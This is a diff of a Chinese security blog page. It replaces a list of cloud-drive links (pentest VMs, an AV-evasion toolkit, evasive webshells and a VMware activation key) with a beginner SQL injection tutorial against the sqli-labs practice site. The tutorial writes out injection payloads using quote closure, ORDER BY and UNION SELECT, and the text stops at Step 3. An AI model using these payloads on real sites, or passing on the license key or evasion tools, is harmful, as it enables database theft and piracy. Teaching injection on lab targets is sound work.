@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="在这里找到你需要的关于网安的所有资源！">
-<title>0.安全类工具文件资源库</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="GET类型的mysql类数据库注入初步教程，包括手动和工具辅助两部分">
+<title>1.5 mysql注入初步</title>
 
-<link rel='canonical' href='https://www.retr0.xyz/p/0.%E5%AE%89%E5%85%A8%E7%B1%BB%E5%B7%A5%E5%85%B7%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E5%BA%93/'>
+<link rel='canonical' href='https://www.retr0.xyz/p/1.5-mysql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%AD%A5/'>
 
-<link rel="stylesheet" href="/scss/style.min.cdfea7edd08f20a450e32e39a442d404d324012e6a68d984ad7ca649217d9edf.css"><meta property='og:title' content="0.安全类工具文件资源库">
-<meta property='og:description' content="在这里找到你需要的关于网安的所有资源！">
-<meta property='og:url' content='https://www.retr0.xyz/p/0.%E5%AE%89%E5%85%A8%E7%B1%BB%E5%B7%A5%E5%85%B7%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E5%BA%93/'>
+<link rel="stylesheet" href="/scss/style.min.cdfea7edd08f20a450e32e39a442d404d324012e6a68d984ad7ca649217d9edf.css"><meta property='og:title' content="1.5 mysql注入初步">
+<meta property='og:description' content="GET类型的mysql类数据库注入初步教程，包括手动和工具辅助两部分">
+<meta property='og:url' content='https://www.retr0.xyz/p/1.5-mysql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%AD%A5/'>
 <meta property='og:site_name' content='Retr0的小窝'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-11-17T15:58:53&#43;08:00'/><meta property='article:modified_time' content='2025-11-17T15:58:53&#43;08:00'/>
-<meta name="twitter:title" content="0.安全类工具文件资源库">
-<meta name="twitter:description" content="在这里找到你需要的关于网安的所有资源！">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-11-28T20:07:03&#43;08:00'/><meta property='article:modified_time' content='2025-11-28T20:07:03&#43;08:00'/>
+<meta name="twitter:title" content="1.5 mysql注入初步">
+<meta name="twitter:description" content="GET类型的mysql类数据库注入初步教程，包括手动和工具辅助两部分">
     <link rel="shortcut icon" href="/favicon.ico" />
 
         <link rel="stylesheet" href="/css/APlayer.min.css">
@@ -257,7 +257,60 @@
     </ol>
 </aside>
 
-    
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#手动注入">手动注入</a>
+      <ol>
+        <li><a href="#step1破坏数据库语句">Step1：破坏数据库语句</a></li>
+        <li><a href="#step2确定查询了多少个栏目">Step2：确定查询了多少个栏目</a></li>
+        <li><a href="#step3显示报错位">Step3：显示报错位</a></li>
+        <li><a href="#step4查看数据库的库名">Step4：查看数据库的库名</a></li>
+        <li><a href="#step5根据库名查看表名">Step5：根据库名查看表名</a></li>
+        <li><a href="#step6查询所需表的列栏目名">Step6：查询所需表的列（栏目）名</a></li>
+        <li><a href="#step7全部取出username及对应password">Step7：全部取出username及对应password</a>
+          <ol>
+            <li><a href="#方法一group_concat语法">方法一：group_concat()语法</a></li>
+            <li><a href="#方法二limit-ab-语法">方法二：limit a,b 语法</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#工具辅助注入">工具辅助注入</a>
+      <ol>
+        <li><a href="#sqlmap-用法使用kali版本">sqlmap 用法（使用Kali版本）</a></li>
+        <li><a href="#略微引申post类型的注入">略微引申：POST类型的注入</a></li>
+      </ol>
+    </li>
+    <li><a href="#拓展知识">拓展知识</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
 
             <main class="main full-width">
     <article class="main-article">
@@ -271,17 +324,21 @@
                 网安
             </a>
         
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%B8%93%E4%B8%9A/" >
+                渗透测试微专业
+            </a>
+        
     </header>
     
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/0.%E5%AE%89%E5%85%A8%E7%B1%BB%E5%B7%A5%E5%85%B7%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E5%BA%93/">0.安全类工具文件资源库</a>
+            <a href="/p/1.5-mysql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%AD%A5/">1.5 mysql注入初步</a>
         </h2>
     
         
         <h3 class="article-subtitle">
-            在这里找到你需要的关于网安的所有资源！
+            GET类型的mysql类数据库注入初步教程，包括手动和工具辅助两部分
         </h3>
         
     </div>
@@ -302,7 +359,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">2025-11-17</time>
+                <time class="article-time--published">2025-11-28</time>
             </div>
         
 
@@ -325,243 +382,280 @@
     <section class="article-content">
     
     
-    <p><strong>部分虚拟机的密码在文件名上</strong></p>
-<p>===============================</p>
-<p>日常工具（包含VMware以及其他常用小工具）</p>
-<p>链接：<a class="link" href="https://pan.baidu.com/s/1Cas0WpP1XkOf8Blh0pOFSw"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1Cas0WpP1XkOf8Blh0pOFSw</a><br>
-提取码：67uq</p>
-<p>vmware激活</p>
-<p>vmware17.5.2激活（本机为win11系统使用）</p>
-<p>MC60H-DWHD5-H80U9-6V85M-8280D</p>
-<p>vmware17.5.2安装参考</p>
-<p><a class="link" href="https://word.huayunsys.com/thread-688-1-1.html"  target="_blank" rel="noopener"
-    >https://word.huayunsys.com/thread-688-1-1.html</a></p>
-<p>=============================</p>
-<p>win10渗透测试工具预安装虚拟机（日常使用）<br>
-<a class="link" href="https://pan.baidu.com/s/1VydYshBifpLR1U7tLowyBA"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1VydYshBifpLR1U7tLowyBA</a></p>
-<p>提取码: zy7p</p>
-<p>parrot渗透src工具预安装虚拟机（日常使用）<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1GOqLxz-tCSIGZrX2TLeaZg"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1GOqLxz-tCSIGZrX2TLeaZg</a></p>
-<p>提取码: qjp7</p>
-<p>=============================</p>
-<p>kali预安装虚拟机系列</p>
-<p>kali2018 x64（预安装）-优先使用（文件传输使用bitvise）<br>
-链接: <a class="link" href="https://pan.baidu.com/s/10lm6F5UO0q2f16kRVKXRqw"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/10lm6F5UO0q2f16kRVKXRqw</a></p>
-<p>提取码: 6s8i</p>
-<p>kali 2025-1 x64位（预安装）</p>
-<p>链接: <a class="link" href="https://pan.baidu.com/s/1gXSP1me3Z6djvsFJjV7-Jw"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1gXSP1me3Z6djvsFJjV7-Jw</a> 提取码: c2sd</p>
-<p>kali2023.2 with Clash（需要高版本kali实验以及全局vpn使用）</p>
-<p>链接：<a class="link" href="https://pan.baidu.com/s/1h-2pY_NmDEWzD5ve_sadLw"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1h-2pY_NmDEWzD5ve_sadLw</a><br>
-提取码：a7vm</p>
-<p>关于v2ray转clash配置的生成地址</p>
-<p><a class="link" href="https://acl4ssr-sub.github.io/"  target="_blank" rel="noopener"
-    >https://acl4ssr-sub.github.io/</a></p>
-<p>kali 1.0.6 x64位（预安装）</p>
-<p>链接：<a class="link" href="https://pan.baidu.com/s/1fE6sTVYLNXVi1wokT0GE_w"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1fE6sTVYLNXVi1wokT0GE_w</a><br>
-提取码：oe8g</p>
-<p>=========================</p>
-<p>空靶机系列</p>
-<p>win7nosp预安装虚拟机（适合渗透测试实验，自带chrome，phpstudy，无vmwaretools）</p>
-<p>链接：<a class="link" href="https://pan.baidu.com/s/1ZIEB06P727Fau6afz5zI1A"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1ZIEB06P727Fau6afz5zI1A</a> 提取码：pvql</p>
-<p>win7sp1预安装虚拟机（适合普通实验）</p>
-<p>链接：<a class="link" href="https://pan.baidu.com/s/1adkc-lYiw2IRc2ztpTWVjg"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1adkc-lYiw2IRc2ztpTWVjg</a>  提取码：dvl5</p>
-<p>win10预安装虚拟机链接（普通实验靶机）：</p>
-<p>链接: <a class="link" href="https://pan.baidu.com/s/1qWT4DeG8uujcsjgpeFBWjg"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1qWT4DeG8uujcsjgpeFBWjg</a> 提取码: bpat</p>
-<p>===============================</p>
-<p>特殊实验虚拟机</p>
-<p>src挖洞虚拟机<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1QTZJ1ExIyYKkEEj-hTV8Gw"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1QTZJ1ExIyYKkEEj-hTV8Gw</a> 提取码: mesk</p>
-<p>parrot预安装虚拟机</p>
-<p>链接：<a class="link" href="https://pan.baidu.com/s/1m9GAPluSlkeb1ul8qYW2ag"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1m9GAPluSlkeb1ul8qYW2ag</a>  提取码：mo8m</p>
-<p>win2019数据中心版预安装虚拟机<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1P8VXiwHay9HpA6BshBI6tw"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1P8VXiwHay9HpA6BshBI6tw</a> 提取码: cbl9</p>
-<p>win2012标准版预安装虚拟机<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1leMe8dBmf1A0R9xA-0N0aA"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1leMe8dBmf1A0R9xA-0N0aA</a> 提取码: voou</p>
-<p>win2008企业版预安装虚拟机+phpstudy<br>
-链接：<a class="link" href="https://pan.baidu.com/s/1gAhA8A14HL5zXXJTFRGNDQ"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1gAhA8A14HL5zXXJTFRGNDQ</a> 提取码：97fa</p>
-<p>centos7普通预安装虚拟机<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1vU6w6jJ58C9v9wxnGOEr0Q"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1vU6w6jJ58C9v9wxnGOEr0Q</a> 提取码: f1c4</p>
-<p>centos7预安装phpstudy<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1pol4yliVnnau9LqsM0nUjw"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1pol4yliVnnau9LqsM0nUjw</a> 提取码: xtmv</p>
-<p>centos7预安装redis<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1sdIu2_96xr5M7xG5EIOivQ"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1sdIu2_96xr5M7xG5EIOivQ</a> 提取码: qyv8</p>
-<p>centos7预安装docker<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1bZqqRKEAQH0FdEzxvnHmBA"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1bZqqRKEAQH0FdEzxvnHmBA</a> 提取码: 1vr3</p>
-<p>云安全3台centos7预安装k8s<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1awjXfkR4xRitkenSyPpn_w"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1awjXfkR4xRitkenSyPpn_w</a> 提取码: 9ieh</p>
-<p>ubuntu x64 20.04.3预安装虚拟机<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1PIRuo1h4RBxegqYIkMFx2g"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1PIRuo1h4RBxegqYIkMFx2g</a> 提取码: rcsd</p>
-<p>域环境3台虚拟机（用户名密码都在文件名中）</p>
-<p>链接: <a class="link" href="https://pan.baidu.com/s/1oq4bG4ecWaB97324V91GCw"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1oq4bG4ecWaB97324V91GCw</a> 提取码: 174l</p>
-<p>预安装防火墙Monowall<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1EBYTLw_U74z6uj18UIA-Yw"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1EBYTLw_U74z6uj18UIA-Yw</a> 提取码: wkvh</p>
-<p>=====================</p>
-<p>特殊情况</p>
-<p>苹果m1芯片win10虚拟机</p>
-<p>链接：<a class="link" href="https://pan.baidu.com/s/1cRvML1jPv6JfGBYfhAwEkA"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1cRvML1jPv6JfGBYfhAwEkA</a><br>
-提取码：3r0j</p>
-<p>=========================</p>
-<p>渗透+逆向工程虚拟机</p>
-<p>win7完整滲透測試+逆向工程工具預安裝虛擬機</p>
-<p>链接：<a class="link" href="https://pan.baidu.com/s/1r6AhgRLtkciqyUtep7okcA"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1r6AhgRLtkciqyUtep7okcA</a><br>
-提取码：5z9u</p>
-<p>=====================</p>
-<p>ctf版win10预安装虚拟机</p>
-<p>win10-ctf.ova<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1wGtsdYzBIr4GcnjHxmh4lQ"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1wGtsdYzBIr4GcnjHxmh4lQ</a> 提取码: pzjj</p>
-<p>=====================</p>
-<p>安全靶场类</p>
-<p>链接：<a class="link" href="https://pan.baidu.com/s/1dmU9DcXAthjY0te4qv4tAg"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1dmU9DcXAthjY0te4qv4tAg</a><br>
-提取码：38mj</p>
-<p>代码审计源码类</p>
-<p>链接：<a class="link" href="https://pan.baidu.com/s/1VU5IZAMXSmSrerN69-502w"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1VU5IZAMXSmSrerN69-502w</a><br>
-提取码：p7vj</p>
-<p>misc类</p>
-<p>链接：<a class="link" href="https://pan.baidu.com/s/10d_oMAABD1sulW83qbDMtA"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/10d_oMAABD1sulW83qbDMtA</a><br>
-提取码：hk03</p>
-<p>数字取证类</p>
-<p>链接：<a class="link" href="https://pan.baidu.com/s/11yOS0eQajxSnSqQ8xHQFgA"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/11yOS0eQajxSnSqQ8xHQFgA</a><br>
-提取码：qfux</p>
-<p>========================</p>
-<p>逆向工程实验包</p>
-<p><a class="link" href="https://pan.baidu.com/s/1lwAKPU6leg2A1bJX7LMyUg"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1lwAKPU6leg2A1bJX7LMyUg</a></p>
-<p>提取码: 8pj5</p>
-<p>=========================</p>
-<p>ctf系列实验包</p>
-<p>链接：<a class="link" href="https://pan.baidu.com/s/1ZPfV05b7AoL4CF2Ex9wHwg"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1ZPfV05b7AoL4CF2Ex9wHwg</a><br>
-提取码：qafo</p>
-<p>==========================</p>
-<p>AOME备份还原系统</p>
-<p>链接：<a class="link" href="https://pan.baidu.com/s/1xwEQC4d0ub5S3pg78fGPrA"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1xwEQC4d0ub5S3pg78fGPrA</a><br>
-提取码：8cnu</p>
-<p>============================</p>
-<p>游戏外挂辅助学习<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1MLKND0RapwTPxW2ciOC1Wg"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1MLKND0RapwTPxW2ciOC1Wg</a></p>
-<p>提取码: h4bm</p>
-<p>免杀工具包<br>
-链接: <a class="link" href="https://pan.baidu.com/s/17Rd6YAYhgHDv5u7pteWWJw"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/17Rd6YAYhgHDv5u7pteWWJw</a></p>
-<p>提取码: 3f1d</p>
-<p>web漏洞.rar<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1YA7RjBa4-ibrkxyhWJfz0A"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1YA7RjBa4-ibrkxyhWJfz0A</a></p>
-<p>提取码: wcgt</p>
-<p>服务攻防</p>
-<p>链接无法分享</p>
-<p>红队工具<br>
-<a class="link" href="https://pan.baidu.com/s/1AYGBjVYVKlDx9AEF_maiPQ"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1AYGBjVYVKlDx9AEF_maiPQ</a></p>
-<p>提取码: em5w</p>
-<p>蓝队工具</p>
-<p><a class="link" href="https://pan.baidu.com/s/1Zkc1vCsonzZBQ2Q2stZQNA"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1Zkc1vCsonzZBQ2Q2stZQNA</a></p>
-<p>提取码: hw32</p>
-<p>免杀webshell</p>
-<p><a class="link" href="https://pan.baidu.com/s/1plbtPsJllE4fetMcAmtU4g"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1plbtPsJllE4fetMcAmtU4g</a></p>
-<p>提取码: 7inr</p>
-<p>信息收集补充<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1P8HoH3jMPwTIXf-ji6Scsg"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1P8HoH3jMPwTIXf-ji6Scsg</a></p>
-<p>提取码: gfhg</p>
-<p>云安全工具<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1l-FMgaccQlrxhFJHakGvNA"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1l-FMgaccQlrxhFJHakGvNA</a></p>
-<p>提取码: q9ev</p>
-<p>ONE-FOX集成工具箱_V6<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1gu5Z7z2Ls6wW_8FOSOEH0A"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1gu5Z7z2Ls6wW_8FOSOEH0A</a></p>
-<p>提取码: exxx</p>
-<p>移动终端工具(密码huayunsys.com).rar<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1gNQ-okYjgeg7aoz6Cono0Q"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1gNQ-okYjgeg7aoz6Cono0Q</a></p>
-<p>提取码: x227</p>
-<p>===========================</p>
-<p>vulfocus靶场<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1YPJfsN6WFwA7Q9viE8ejLg"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1YPJfsN6WFwA7Q9viE8ejLg</a></p>
-<p>提取码: wbsv</p>
-<p>snort2虚拟机<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1oZpepxjTHY5qLqYb5UD4IQ"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1oZpepxjTHY5qLqYb5UD4IQ</a></p>
-<p>提取码: 4fsi</p>
-<p>雷池虚拟机<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1tByIap_RTrLPFwKRfAaxBA"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1tByIap_RTrLPFwKRfAaxBA</a></p>
-<p>提取码: ceuv</p>
-<p>蜜罐虚拟机<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1u3EauAmLuILovlcbe-cGnw"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1u3EauAmLuILovlcbe-cGnw</a></p>
-<p>提取码: akvm</p>
-<p>suicata虚拟机<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1uImCWMW_LttEbFrEae5n-Q"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1uImCWMW_LttEbFrEae5n-Q</a></p>
-<p>提取码: sg9t</p>
-<p>jumpserver堡垒机<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1fUJFAkUPg99f6g72oELVBA"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1fUJFAkUPg99f6g72oELVBA</a></p>
-<p>提取码: gvi5</p>
-<p>Mobexler<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1OFdDyEkyNiWP5ms2IEMrEg"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1OFdDyEkyNiWP5ms2IEMrEg</a></p>
-<p>提取码: 2nm8</p>
-<p>ELK日志分析<br>
-链接: <a class="link" href="https://pan.baidu.com/s/176TUQmmRjwGmuQhuPFLCuw"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/176TUQmmRjwGmuQhuPFLCuw</a></p>
-<p>提取码: s73m</p>
-<p>HIDS-Wazuh<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1s7_Xh6XOJ9Ea648gJnOeNw"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1s7_Xh6XOJ9Ea648gJnOeNw</a></p>
-<p>提取码: e6rv</p>
-<p>==========================</p>
-<p>win10-java8预安装虚拟机<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1QEAM5-apx8UKn1ZijQZ8IQ"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1QEAM5-apx8UKn1ZijQZ8IQ</a></p>
-<p>提取码: m9wd</p>
-<p>===========================</p>
-<p>win10-vc2022-qt预安装虚拟机<br>
-链接: <a class="link" href="https://pan.baidu.com/s/18BudoNm569KZk4ildcODJw"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/18BudoNm569KZk4ildcODJw</a></p>
-<h1 id="提取码-79qu">提取码: 79qu
-</h1><p>win10-ctf虚拟机<br>
-链接: <a class="link" href="https://pan.baidu.com/s/1ayzi1gzJGmiiNo1KBVo3kA"  target="_blank" rel="noopener"
-    >https://pan.baidu.com/s/1ayzi1gzJGmiiNo1KBVo3kA</a></p>
-<p>提取码: ku4v</p>
-<p>============================</p>
+    <h2 id="手动注入">手动注入
+</h2><p>以靶场<a class="link" href="http://sqlilabs.njhack.xyz/Less-1/index.php"  target="_blank" rel="noopener"
+    >http://sqlilabs.njhack.xyz/Less-1/index.php</a>为例</p>
+<h3 id="step1破坏数据库语句">Step1：破坏数据库语句
+</h3><blockquote>
+<p>破坏数据库语句的目的就是让数据库报错，通过报错信息猜测查询语句的写法</p>
+</blockquote>
+<p>数据库传入参数的几种闭合方式：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">&#39;&#39;
+</span></span><span class="line"><span class="cl">&#34;&#34;
+</span></span><span class="line"><span class="cl">()
+</span></span><span class="line"><span class="cl">((&#39;&#39;))
+</span></span><span class="line"><span class="cl">(&#34;&#34;)
+</span></span><span class="line"><span class="cl">((&#34;&#34;))
+</span></span><span class="line"><span class="cl">(())
+</span></span><span class="line"><span class="cl">没有闭合方式
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<p><strong>补充1：</strong></p>
+<p><code>\</code>称为转义字符，可以把自己后面的第一个东西当作字符串去执行</p>
+<hr>
+<p>我们传入以下参数：<code>2\</code></p>
+<p>有如下报错：</p>
+<p><img src="https://free.picui.cn/free/2025/11/28/69298f0c3f5d4.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>我们选取其中核心部分<code>''2\' LIMIT 0,1'</code>去掉头尾<font style="color:#DF2A3F;">（因为头尾用来闭合的符号是php报错语句携带的，不是真实代码）</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="err">&#39;</span><span class="mi">2</span><span class="nx">\</span><span class="err">&#39;</span> <span class="nx">LIMIT</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由此得知该数据库的查询语句是单引号<code>''</code>闭合</p>
+<p>因此大概估计查询语句可能为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">select</span> <span class="nx">username</span><span class="p">,</span><span class="nx">password</span> <span class="nx">from</span> <span class="nx">tablex</span> <span class="nx">where</span> <span class="nx">id</span> <span class="o">=</span> <span class="s1">&#39;$id&#39;</span> <span class="nx">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong><font style="color:#DF2A3F;">解释：</font></strong><font style="color:#DF2A3F;">此处</font><code>limit a,b</code><font style="color:#DF2A3F;">语法指从数据表的第a条起选取b条数据</font></p>
+<p><font style="color:#DF2A3F;">数据表条目要从第0个开始数</font></p>
+<hr>
+<p><strong>补充2：</strong></p>
+<ol>
+<li>数据库的注释符：<code>--</code>、<code>/**/</code>、<code>#</code></li>
+<li><code>+</code>在GET请求里相当于空格</li>
+</ol>
+<p><code>+</code>一般配合<code>--</code>作为GET请求的注释符使用</p>
+<hr>
+<p>接下来我们传入参数<code>id=2' --+</code>，那么拼成的语句是：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">select</span> <span class="nx">username</span><span class="p">,</span><span class="nx">password</span> <span class="nx">from</span> <span class="nx">tablex</span> <span class="nx">where</span> <span class="nx">id</span> <span class="o">=</span> <span class="s1">&#39;2&#39;</span> <span class="o">--+</span> <span class="err">&#39;</span><span class="nx">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于<code>--</code>把后面的内容都注释掉了，实际上执行的数据库语句应该是：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">select</span> <span class="nx">username</span><span class="p">,</span><span class="nx">password</span> <span class="nx">from</span> <span class="nx">tablex</span> <span class="nx">where</span> <span class="nx">id</span> <span class="o">=</span> <span class="s1">&#39;2&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>提交参数发现查询正常（如图），说明它真的是用<code>''</code>进行闭合的</p>
+<p><img src="https://free.picui.cn/free/2025/11/28/69298f0c43d19.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<h3 id="step2确定查询了多少个栏目">Step2：确定查询了多少个栏目
+</h3><p>从现在开始我们要调用各种语法查询数据，<font style="color:#DF2A3F;">记住之后的语法全部都是插入在</font><code>2' {} --+</code><font style="color:#DF2A3F;">中的花括号位置！</font></p>
+<p>因为之前的语句中username,password栏目是猜测的，所以接下来要核实究竟有多少个栏目</p>
+<p>传入参数<code>2' order by [数字] --+</code>使用二分法查看</p>
+<p>依次传参，其中数字填为10、5、3&hellip;&hellip;</p>
+<p>当数字最大为<strong>3</strong>时有结果，改为<strong>4</strong>时没有结果</p>
+<p>因此确定查询出了<strong>3</strong>个栏目，之前的猜测错误</p>
+<p>修正：可能的查询项目是<code>id,username,password</code></p>
+<h3 id="step3显示报错位">Step3：显示报错位
+</h3><p>传入参数<code>2' union select 1,2,3  --+</code>返回结果</p>
+<p><img src="https://free.picui.cn/free/2025/11/28/69298f0c8d1b4.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>但是我们想要让查询的1,2,3显示出来，所以要故意让<code>union</code>之前的查询语句出错掩盖掉正常数据</p>
+<p>传入参数<code>-2' union select 1,2,3  --+</code>返回结果</p>
+<p><img src="https://free.picui.cn/free/2025/11/28/69298f0c7a6ae.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>说明2、3号位是报错位（显示位）</p>
+<hr>
+<p><strong>补充3：</strong></p>
+<p><code>union select a,b,c</code>语法为<strong>联合查询</strong>，方便我们将两条查询语句捆绑起来一起执行，<font style="color:#DF2A3F;">而且即便其中一条查询语句报错也不影响另一条查询语句输出结果</font>，本地演示效果如下：</p>
+<p><img src="https://free.picui.cn/free/2025/11/28/69298f0c781ab.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>第二条select查询的1,2,3正好与前面查询的3个项目一一对应显示，<strong><font style="color:#DF2A3F;">因此第二条select内容务必参照Step2中获得的查询栏目数填写！</font></strong></p>
+<hr>
